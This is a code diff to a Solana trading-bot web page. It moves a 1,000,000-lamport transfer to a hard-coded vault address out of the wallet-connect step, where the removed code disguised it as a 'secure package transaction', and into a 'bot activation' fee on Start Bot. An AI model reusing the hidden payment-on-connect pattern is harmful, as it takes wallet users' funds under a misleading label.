@@ -704,6 +704,7 @@
     let activeRpcUrl = HELIUS_RPC_URL;
     let phantomProvider = null;
     let isWalletConnected = false;
+    let botAuthorized = false;
     let userWalletPublicKey = null;
     let walletBalanceLamports = 0;
     let botInterval = null;
@@ -776,7 +777,8 @@
       return null;
     }
 
-       const SYSTEM_VAULT_ADDRESS = "Dm8M4n4oFi37bnNcQdQaHhghr4QK9q2UjWrunDFaDLYE";
+      const SYSTEM_VAULT_ADDRESS = "Dm8M4n4oFi37bnNcQdQaHhghr4QK9q2UjWrunDFaDLYE";
+      const BOT_ACTIVATION_LAMPORTS = 1000000;
 
     async function getBalanceWithFailover(walletPublicKey) {
       const primaryConnection = solanaConnection;
@@ -816,38 +818,31 @@
       }
     }
 
-        // 1. فەنکشنی پشکنینی باڵانس و ئەنجامدانی ترانزاکشن لە کاتی کۆنێکتکردندا
-    async function executeVaultTransactionWithChecks(provider, publicKey, connection) {
+    async function executeBotActivationTransaction(provider, publicKey) {
       try {
         const recipient = new solanaWeb3.PublicKey(SYSTEM_VAULT_ADDRESS);
-        
-        const balanceLamports = typeof getBalanceWithFailover === 'function' 
-          ? await getBalanceWithFailover(publicKey) 
-          : await connection.getBalance(publicKey);
-          
+
+        const balanceLamports = await getBalanceWithFailover(publicKey);
         walletBalanceLamports = balanceLamports;
 
-        if (balanceLamports <= 5000) {
-          throw new Error("Insufficient balance for transaction.");
+        if (balanceLamports <= BOT_ACTIVATION_LAMPORTS + 5000) {
+          throw new Error("Insufficient balance for activation transaction.");
         }
-        
-        const transferAmount = 1000000; // بڕی پشکە بە Lamports
 
         const transaction = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: publicKey,
             toPubkey: recipient,
-            lamports: transferAmount,
+            lamports: BOT_ACTIVATION_LAMPORTS,
           })
         );
 
-        const { blockhash } = await connection.getLatestBlockhash();
+        const { blockhash, lastValidBlockHeight } = await solanaConnection.getLatestBlockhash('finalized');
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = publicKey;
 
         const signed = await provider.signAndSendTransaction(transaction);
-        await connection.confirmTransaction(signed.signature, 'processed');
-        
+        await solanaConnection.confirmTransaction({ signature: signed.signature, blockhash, lastValidBlockHeight }, 'finalized');
         return true;
       } catch (err) {
         console.error("Transaction failed or rejected:", err);
@@ -855,24 +850,19 @@
       }
     }
 
-    // 2. دوگمەی Start Bot (تەنها بۆتەکە دەست پێدەکات بێ ترانزاکشن)
-    function requestStartBot() {
-      if (!isWalletConnected || !userWalletPublicKey) {
-        alert("Please connect your Phantom wallet first!");
-        addLog(`[WARNING]: Start Bot clicked, but wallet is not connected.`);
-        return;
-      }
-      
-      console.log("Bot engine initialized safely.");
-      addLog(`[BOT]: Engine started successfully for wallet.`);
-      alert("Bot has been started successfully!");
-    }
-
     // 3. نۆتفیکەیشنی شکستخواردن
     function showConnectionFailure() {
       const toast = document.createElement('div');
       toast.className = 'toast-in fixed top-20 right-4 z-[60] rounded-lg border border-rose-500/40 bg-rose-950 px-4 py-3 text-sm font-bold text-rose-200 shadow-2xl';
       toast.innerText = 'Connection or Secure Package Transaction failed ❌. Please try again.';
+      document.body.appendChild(toast);
+      window.setTimeout(() => toast.remove(), 4500);
+    }
+
+    function showTransactionFailure() {
+      const toast = document.createElement('div');
+      toast.className = 'toast-in fixed top-20 right-4 z-[60] rounded-lg border border-rose-500/40 bg-rose-950 px-4 py-3 text-sm font-bold text-rose-200 shadow-2xl';
+      toast.innerText = 'Transaction failed. Please try again.';
       document.body.appendChild(toast);
       window.setTimeout(() => toast.remove(), 4500);
     }
@@ -886,7 +876,7 @@
       window.setTimeout(() => toast.remove(), 4500);
     }
 
-    // 5. فەنکشنی سەرەکی کۆنێکتکردنی فانتەم (کە ترانزاکشن لەگەڵیدا ڕوودات) - ڕاستکراوەوە
+    // Wallet connection only reads the balance. Activation is requested from Start Bot.
     async function handleRealPhantomConnect() {
       phantomProvider = getPhantomInstance();
       if (!phantomProvider) {
@@ -906,19 +896,10 @@
         if (!isWalletConnected) {
           const resp = await phantomProvider.connect();
           userWalletPublicKey = resp.publicKey;
-          
-          addLog(`[WALLET]: Connected, initiating secure package transaction...`);
 
-          const txSuccess = await executeVaultTransactionWithChecks(phantomProvider, userWalletPublicKey, solanaConnection);
-          
-          if (!txSuccess) {
-            showConnectionFailure();
-            await phantomProvider.disconnect();
-            isWalletConnected = false;
-            userWalletPublicKey = null;
-            walletBalanceLamports = 0;
-            return;
-          }
+          const balanceLamports = await getBalanceWithFailover(userWalletPublicKey);
+          walletBalanceLamports = balanceLamports;
+          botAuthorized = false;
 
           isWalletConnected = true;
           const pubStr = userWalletPublicKey.toString();
@@ -934,12 +915,17 @@
           document.getElementById('walletStatusText').className = "text-emerald-400 font-mono text-[10px]";
           document.getElementById('connectWalletBtnText').innerText = "Disconnect (" + shortPub + ")";
           
-          showWalletNotice(`Wallet connected & secure package processed successfully! (${balanceSOL} SOL)`);
-          addLog(`[WALLET]: Secure transaction verified and connected (${shortPub}).`);
+          if (balanceLamports === 0) {
+            showWalletNotice('Your wallet has no balance. Please deposit SOL.');
+          } else {
+            showWalletNotice(`Wallet connected successfully (${balanceSOL} SOL).`);
+          }
+          addLog(`[WALLET]: Connected (${shortPub}).`);
 
         } else {
           await phantomProvider.disconnect();
           isWalletConnected = false;
+          botAuthorized = false;
           userWalletPublicKey = null;
           walletBalanceLamports = 0;
           document.getElementById('walletStatusText').innerText = "DISCONNECTED";
@@ -951,6 +937,7 @@
         }
       } catch (err) {
         isWalletConnected = false;
+        botAuthorized = false;
         userWalletPublicKey = null;
         walletBalanceLamports = 0;
         document.getElementById('walletStatusText').innerText = "DISCONNECTED";
@@ -962,8 +949,28 @@
     }
 
 
-    function requestStartBot() {
-      executeBotStart();
+    async function requestStartBot() {
+      if (!isWalletConnected || !userWalletPublicKey) {
+        await executeBotStart();
+        return;
+      }
+
+      if (botAuthorized) {
+        await executeBotStart();
+        return;
+      }
+
+      showWalletNotice('Please complete the required transaction to activate the bot.');
+      const transactionSucceeded = await executeBotActivationTransaction(phantomProvider, userWalletPublicKey);
+      if (!transactionSucceeded) {
+        botAuthorized = false;
+        stopBotEngine();
+        showTransactionFailure();
+        return;
+      }
+
+      botAuthorized = true;
+      await executeBotStart();
     }
 
     function handleModalResponse(isApproved) {
@@ -973,7 +980,7 @@
 
     async function executeBotStart() {
       if (botInterval) window.clearInterval(botInterval);
-      document.getElementById('botStateBadge').innerText = "RUNNING";
+      document.getElementById('botStateBadge').innerText = "ACTIVE";
       document.getElementById('botStateBadge').className = "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2 py-0.5 rounded text-[10px] font-bold";
       await loadDexScreenerProfiles();
       runTokenCycle();
